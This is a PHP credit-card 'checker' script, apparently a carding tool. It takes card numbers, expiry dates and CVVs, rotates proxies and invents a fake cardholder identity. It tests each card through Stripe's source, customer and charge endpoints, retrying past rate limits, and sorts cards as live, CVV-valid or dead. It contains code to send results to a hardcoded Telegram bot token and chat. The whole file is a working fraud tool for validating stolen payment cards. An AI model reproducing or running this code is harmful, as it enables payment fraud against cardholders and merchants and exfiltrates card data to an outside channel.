<?php
//===================== [ BROSS CHECKER ] ====================//
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');
//================ [ FUNCTIONS & LISTA ] ===============//
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
function handleError() {
  // Do something to handle the error, such as logging it or displaying an error message to the user
  error_log('Error occurred while making the HTTP request');
}
////////////////////////////////////////////////////////////////////
  // Use proxy code here
$proxy = $_GET['proxy'];

function rebootproxys($retry = 0, $proxy) {
  if ($proxy == 'yes') {
    $proxySocks = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxySocks) - 1);
    $proxySocks = trim($proxySocks[$myproxy]); // remove any leading/trailing whitespace
    // check if proxy server is working
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $ip1 = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($http_code == 200 && !empty($ip1)) {
      return $ip1;
    } else {
      if ($retry < 10) {
        // Retry up to 3 times if the IP is not working
        return rebootproxys($retry + 1, $proxy);
      } else {
        return false;
      }
    }
  } else { //if proxy is not set to yes 
      return true;  //return false and continue the code 
  }
}

$retryCount = 0;
while ($retryCount < 10) {
  $proxyIP = rebootproxys($retryCount, $proxy);
  if ($proxyIP) { //if proxyIP is true 
    break; //break out of the loop 
  } else { //if proxyIP is false 
    $retryCount++; //increment the retry count 
  }
}

if ($retryCount == 10) { //if retry count is 10 
  echo "Failed to select a working proxy server after 10 retries. Exiting.\n"; //print out this message 
  exit(); //exit the code 
}
$proxyEcho = $proxyIP. "✅👍";
//////////////////////////////////////////////////////////////////////////////////////////////////
$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
    $amt = '1';
    $chr = $amt * 100;
}
$amtMap = array(
    '0.5' => '050',
    '0.6' => '060',
    '0.7' => '070',
    '0.8' => '080',
    '0.9' => '090',
    '1' => '100',
    '2' => '200',
    '3' => '300',
    '4' => '400',
    '5' => '500',
    '6' => '600',
    '7' => '700',
    '8' => '800',
    '9' => '900',
    '10' => '1000'
);
$amt = $amtMap[$amt] ?? '';
$sk = $_GET['skgate'];
$lista = $_GET['lista'];
$crn = $_GET['crn'];
if(empty($crn)) {
    $crn = 'usd';
}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
////////////////////////////////////////////////////////////////////////////////////////////////////
$bin_limit_reached = false;
while (!$bin_limit_reached) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $response = curl_exec($ch); 
    /////echo "<br><b>Response: </b> $response<br>";
    curl_close($ch);
    $prepaid = GetStr($response, '"prepaid":', ',');
    $bank = GetStr($response, '"bank":{"name":"', '"');
    $country = GetStr($response, '"name":"', '"');
    $country2 = str_replace(" ", "-", strtolower(GetStr($response, '"name":"', '"')));
    $type = GetStr($response, '"type":"', '"');
    $Emoji = GetStr($response, '"emoji":"','"');
    $ci = " $bank ┃ $type ┃ $country ┃ $Emoji ┃ $prepaid ";
    ////echo $ci;
if (strpos($response, '"type":"')) {
            $bin_limit_reached = true;
            break;
        } else {
            $bin_limit_reached = false;
        }
    }
////////////////////////////////////////
// Set the chat ID and token
$chatID = -1001845357353;
$token = "5856648236:AAEBqiJuFjG-17019DLpRBRi3NozM4kyJnQ";
////////////////////////////===[Random User ]
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//////////////////////////////////////////
//================= [ CURL REQUESTS ] =================//
$rate_limit_reached = false;
$loop_count = 0;
while (!$rate_limit_reached) {
//[Auth Section]
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
  curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
   $r1 = curl_exec($ch);
////echo "<b>r1: </b> $r1<br>";
  $s = json_decode($r1, true);
  $token = $s['id'];
$resp1 = trim(strip_tags(getStr($r1,'"decline_code": "','"')));
$msg1 = trim(strip_tags(getStr($r1,'"message": "','"')));
$cvc1 = Getstr($r1,'"cvc_check": "','"');
$country = Getstr($r1, ' "country": "','"');
$type = Getstr($r1, ' "funding": "','"');
/////////////////////////////////////////////////////////////////////////////
if (strpos($r1, '"code":"rate_limit"') || strpos($r1, '"code": "processing_error"')) {
  $loop_count++;
    $rate_limit_reached = false;
}
elseif (strpos($r1, '"card_not_supported"') || strpos($r1, '"invalid_expiry_year"') || strpos($r1, '"invalid_cvc"') || strpos($r1, '"code": "more_permissions_required_for_application"') || strpos($r1, '"invalid_expiry_month"') || strpos($r1, '"incorrect_number"') || strpos($r1, '"generic_decline"') || strpos($r1, '"testmode_charges_only"') || strpos($r1, '"api_key_expired"') || strpos($r1, '"parameter_invalid_integer"')) {
    echo '<span style="color:red">========================================<br>RESULT: #DEAD ❌ <br> ➔CARD:- `'.$lista.'` <br> ➔MASSAGE R1: '.$resp1.' ┃ '.$msg1.'<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br>';
    $rate_limit_reached = true;
    if (strpos($r1, '"risk_level":')) {
  echo '<span style="color:red">➔risk_level:'.$riskl.'</span><br>';
}
  if (strpos($r1, '"risk_score"')) {
  echo '<span style="color:red">➔risk_score: '.$risk_score.'</span><br>';
}
 if (strpos($r1, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:red">➔IP:'.$proxyEcho.'';
}
if (strpos($r1, '"cvc_check": "pass"') || strpos($r1, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc1.'';
}
    exit();
  }
  elseif(strpos($r1, '"id"')) {
    $rate_limit_reached = true;
    break;
  }
  else {
    $loop_count++;
    $rate_limit_reached = false;
  }
}
$rate_limit_reached2 = false;
while (!$rate_limit_reached2) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.'+'.$last.'&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $r2 = curl_exec($ch);
///echo "<b>r2: </b> $r2<br>";
  $cus = json_decode($r2, true);
$token3 = $cus['id'];
$resp2 = trim(strip_tags(getStr($r2,'"decline_code": "','"')));
 $msg2 = trim(strip_tags(getStr($r2,'"message": "','"')));
 $cvvcheck = trim(strip_tags(getStr($r2,'"cvc_check": "','"')));
 $cvc2 = Getstr($r2,'"cvc_check": "','"');
 $declinecode = trim(strip_tags(getStr($r2,'"decline_code": "','"')));
////echo "<span>  cvv_check = ".$cvvcheck."</span>";


if (strpos($r2, '"code":"rate_limit"')) {
  $loop_count++;
    $rate_limit_reached2 = false;
}
 elseif(strpos($r2, '"generic_decline"')) {
    echo '<span style="color:red">========================================<br>RESULT: #DEAD ❌ <br> ➔CARD:- `'.$lista.'` <br> ➔MASSAGE R2: '.$resp2.' ┃ '.$msg2.'<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br>';
    $rate_limit_reached2 = true;
    if (strpos($r2, '"risk_level":')) {
  echo '<span style="color:red">➔risk_level:'.$riskl.'</span><br>';
}
  if (strpos($r2, '"risk_score"')) {
  echo '<span style="color:red">➔risk_score: '.$risk_score.'</span><br>';
}
 if (strpos($r2, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:red">➔IP:'.$proxyEcho.'';
}
if (strpos($r2, '"cvc_check": "pass"') || strpos($r2, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc2.'';
}
    exit();
  }
  elseif(strpos($r2, "transaction_not_allowed")) {
    echo '<span style="color:red">========================================<br>RESULT: #CVV ✔️ <br> ➔CARD:- `'.$lista.'`<br> ➔MASSAGE R2: '.$resp2.' ┃ '.$msg2.'<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br>';
    $rate_limit_reached2 = true;
    if (strpos($r2, '"risk_level":')) {
  echo '<span style="color:red">➔risk_level:'.$riskl.'</span><br>';
}
  if (strpos($r2, '"risk_score"')) {
  echo '<span style="color:red">➔risk_score: '.$risk_score.'</span><br>';
}
 if (strpos($r2, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:red">➔IP:'.$proxyEcho.'';
}
if (strpos($r2, '"cvc_check": "pass"') || strpos($r2, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc2.'';
}
    exit();
  }
  elseif(strpos($r2, '"id"')) {
    $rate_limit_reached2 = true;
    break;
  }
  else{
    $loop_count++;
    $rate_limit_reached2 = false;
    ///echo "$r2";
  }
}

$rate_limit_reached3 = false;
while (!$rate_limit_reached3) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amt.'&currency='.$crn.'&customer='.$token3.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$r3 = curl_exec($ch);
///echo "<b>r3: </b> $r3<br>";
$char = json_decode($r3, true);
$resp3 = trim(strip_tags(getStr($r3,'"decline_code": "','"')));
 $msg3 = trim(strip_tags(getStr($r3,'"message": "','"')));
 $cvc3 = Getstr($r3,'"cvc_check": "','"');
$chtoken = trim(strip_tags(getStr($r3,'"charge": "','"')));
$chargetoken = $char['charge'];

if (strpos($r3, '"rate_limit"')) {
  $loop_count++;
    $rate_limit_reached = false;
}
elseif (strpos($r3, '"fraudulent"') || strpos($r3,'"pickup_card"') || strpos($r3,'"invalid_account"') || strpos($r3,'"incorrect_number"') || strpos($r3,'"card_decline_rate_limit_exceeded"') || strpos($r3, '"card_not_supported"') || strpos($r3, '"stolen_card"') || strpos($r3, '"lost_card"') || strpos($r3, '"generic_decline"')) {
    echo '<span style="color:red">========================================<br>RESULT: #DEAD ❌ <br> ➔CARD:- `'.$lista.'` <br> ➔MASSAGE R3: '.$resp3.' ┃ '.$msg3.'<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br>';
    if (strpos($r3, '"risk_level":')) {
  echo '<span style="color:red">➔risk_level:'.$riskl.'</span><br>';
}
  if (strpos($r3, '"risk_score"')) {
  echo '<span style="color:red">➔risk_score: '.$risk_score.'</span><br>';
}
 if (strpos($r3, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:red">➔IP:'.$proxyEcho.'';
}
if (strpos($r3, '"cvc_check": "pass"') || strpos($r3, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc3.'';
}
    $rate_limit_reached3 = true;
    exit();
}
elseif (strpos($r3, '"invalid_cvc"')) {
    echo '<span style="color:red">========================================<br>RESULT: #CCN ❎ <br> ➔CARD:- `'.$lista.'` <br> ➔MASSAGE R3: '.$resp3.' ┃ '.$msg3.'<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br>';
    if (strpos($r3, '"risk_level":')) {
  echo '<span style="color:red">➔risk_level:'.$riskl.'</span><br>';
}
  if (strpos($r3, '"risk_score"')) {
  echo '<span style="color:red">➔risk_score: '.$risk_score.'</span><br>';
}
 if (strpos($r3, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:red">➔IP:'.$proxyEcho.'';
}
if (strpos($r3, '"cvc_check": "pass"') || strpos($r3, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc3.'';
}
    $rate_limit_reached3 = true;
    exit();
}
else{
     echo '<span style="color:Aqua">RESULT: #LIVE CHARGED:'.$lista.' <<'.$r1.'>><br><<'.$r2.'>><br><<'.$r3.'>></span><br>';
    $rate_limit_reached3 = true;
    exit();    
}
}
/// Set the default message and the live message
$lista1 = `$lista`;
$CCNMessage = urlencode("➔RESULT: #CCN ❎\nCARD:$lista1\n➔$resp2\n➔$msg2\n➔BIN DATA= $ci\n➔risk_level:$riskl\n➔cvc_check=$cvc");
$CCVMessage = urlencode("➔RESULT: #CVV ✔️ \nCARD:$lista1\n➔$resp2\n➔$msg2\n➔BIN DATA= $ci\n➔risk_level:$riskl\n➔cvc_check=$cvc");
$LIVEMessage = urlencode("➔RESULT: #LIVE CHARGED ✅\nCARD:$lista1\n➔$resp2\n➔$msg2\n➔BIN DATA= $ci\n➔risk_level:$riskl\n➔cvc_check=$cvc\n➔REFONDED= YES");
// Perform the request and get the result
$result = getResult();

  curl_close($ch);
  ob_flush();
// Check if the $sendlive variable is true
if ($sendcvv === true) {
    // Send the live message
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$CCVMessage";
    $response = file_get_contents($apiUrl);
}
elseif ($sendlive === true ) {
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$LIVEMessage";
    $response = file_get_contents($apiUrl);
}
elseif ($sendccn === true) {
    // Send the default message
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$CCNMessage";
    $response = file_get_contents($apiUrl);
}
// The getResult function
function getResult() {
    // Perform the request and return the result
    // Replace this with your actual code to get the result
    return "This is a test result";
}
//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";
?>